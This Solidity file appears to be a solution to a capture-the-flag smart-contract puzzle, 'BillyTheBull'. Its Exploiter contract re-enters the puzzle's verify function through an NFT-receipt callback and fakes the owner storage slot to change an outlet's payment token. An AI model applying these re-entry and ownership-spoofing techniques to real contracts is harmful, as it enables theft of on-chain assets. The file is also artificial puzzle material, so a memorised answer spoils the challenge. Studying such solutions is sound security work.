// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { BillyTheBull } from "../src/BillyTheBull.sol";
import { NFTOutlet } from "../src/NFTOutlet.sol";
import { FreeNFT } from "../src/tokens/FreeNFT.sol";

contract Exploiter {
    address owner;
    uint[2] _gap;
    bool flag;
    address immutable solver;
    BillyTheBull constant puzzle = BillyTheBull(0x1d1499e622D69689cdf9004d05Ec547d650Ff211); // available
    address constant freeNFT = 0xa0Cb889707d426A7A386870A03bc70d1b0697598; // available
    address constant nftOutlet = 0x45C92C2Cd0dF7B2d705EF12CfF77Cb0Bc557Ed22; // available
    uint constant t1 = 143267721616252817158703808654313430641; // calculated manually
    uint constant t2 = 290424947186362195308081791364742201314; // calculated manually

    constructor() {
        solver = msg.sender;
        FreeNFT(freeNFT).setApprovalForAll(nftOutlet, true);
    }

    function onERC721Received(address _operator, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        if (!flag) {
            flag = true;
            puzzle.verify(t1 << 128 | t2, uint160(address(this)));
        }
        return this.onERC721Received.selector;
    }

    function getMagicTokenId() external returns (uint) {
        if (address(NFTOutlet(nftOutlet).paymentToken()) == freeNFT) {
            return t2;
        } else {
            owner = address(this);
            NFTOutlet(nftOutlet).changePaymentToken(freeNFT);
            owner = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496; // hardcode owner of puzzle
            return t1;
        }
    }
}
